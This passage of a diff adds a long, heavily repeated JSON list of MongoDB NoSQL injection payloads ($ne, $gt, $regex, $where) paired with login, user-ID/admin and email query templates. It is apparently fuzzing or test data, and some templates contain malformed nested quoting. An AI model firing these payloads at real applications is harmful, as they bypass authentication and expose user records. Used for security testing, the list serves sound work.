+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
